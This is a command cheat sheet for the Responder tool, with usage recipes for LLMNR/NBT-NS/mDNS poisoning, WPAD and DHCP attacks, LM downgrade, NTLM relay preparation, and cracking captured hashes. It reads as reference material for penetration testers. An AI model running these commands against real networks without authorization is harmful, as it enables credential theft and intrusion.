# responder

> LLMNR/NBT-NS/mDNS poisoner for credential capture.

## Quickstart

```bash
# Start responder on interface
sudo responder -I eth0

# Analyze mode (passive)
sudo responder -I eth0 -A

# With WPAD
sudo responder -I eth0 -wF
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| LLMNR | Link-Local Multicast Name Resolution |
| NBT-NS | NetBIOS Name Service |
| mDNS | Multicast DNS |
| Poisoning | Answer queries to capture hashes |

## Syntax

```text
sudo responder -I <interface> [options]
```

## Options

### Interface

| Option | Description |
|--------|-------------|
| `-I <iface>` | Network interface |
| `-i <ip>` | Local IP (if not auto) |

### Modes

| Option | Description |
|--------|-------------|
| `-A` | Analyze mode (passive) |
| `-w` | WPAD rogue server |
| `-F` | Force WPAD auth |
| `-P` | Force proxy auth |
| `-b` | Return basic HTTP auth |

### Servers

| Option | Description |
|--------|-------------|
| `-r` | Respond to netbios wredir |
| `-d` | Enable DHCP responses |
| `-D` | DHCP domain |
| `-f` | Fingerprint hosts |

### Protocols

| Option | Description |
|--------|-------------|
| `--lm` | Force LM hashing |
| `--disable-ess` | Disable ESS |

### Logging

| Option | Description |
|--------|-------------|
| `-v` | Verbose |
| `-e <ip>` | External IP (NAT) |

## Recipes

### Basic Poisoning

```bash
# Start on interface
sudo responder -I eth0

# With verbose
sudo responder -I eth0 -v

# Analyze only (no poisoning)
sudo responder -I eth0 -A
```

### WPAD Attack

```bash
# Enable WPAD
sudo responder -I eth0 -w

# Force WPAD authentication
sudo responder -I eth0 -wF

# Full WPAD attack
sudo responder -I eth0 -wFP
```

### Capture NTLMv2

```bash
# Standard capture
sudo responder -I eth0

# Hashes saved to:
# /usr/share/responder/logs/
```

### Force LM Hashes

```bash
# Downgrade to LM (older systems)
sudo responder -I eth0 --lm
```

### Specific Network

```bash
# Specify local IP
sudo responder -I eth0 -i 192.168.1.100
```

### With DHCP

```bash
# DHCP responses
sudo responder -I eth0 -d

# DHCP with domain
sudo responder -I eth0 -d -D target.local
```

### Fingerprinting

```bash
# Fingerprint hosts
sudo responder -I eth0 -f
```

## Hash Cracking

```bash
# Find captured hashes
ls /usr/share/responder/logs/

# Crack with hashcat (NTLMv2)
hashcat -m 5600 hashes.txt wordlist.txt

# Crack with john
john --format=netntlmv2 hashes.txt
```

## Configuration

```bash
# Config file
sudo nano /usr/share/responder/Responder.conf

# Enable/disable servers:
# SQL = On
# SMB = On
# HTTP = On
# HTTPS = On
# etc.
```

## Common Scenarios

### Internal Pentest

```bash
# Passive recon first
sudo responder -I eth0 -A

# Then active poisoning
sudo responder -I eth0 -wFPv
```

### Relay Attack Prep

```bash
# Disable SMB and HTTP for relay
# Edit Responder.conf:
# SMB = Off
# HTTP = Off

sudo responder -I eth0
# Then use ntlmrelayx
```

### MultiRelay

```bash
# Start responder without SMB
sudo responder -I eth0 --disable-ess

# Use with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support
```

## Output & Parsing

```bash
# View logs
cat /usr/share/responder/logs/*NTLM*

# Extract hashes for cracking
cat /usr/share/responder/logs/*NTLMv2* | sort -u > hashes.txt

# Monitor in real-time
tail -f /usr/share/responder/logs/Responder-Session.log
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No hashes | Check interface, network |
| Port in use | Stop conflicting services |
| Permission denied | Run with sudo |
| No traffic | Verify same subnet |

## References

- [Responder GitHub](https://github.com/lgandx/Responder)
- [SpiderLabs Responder](https://github.com/SpiderLabs/Responder)
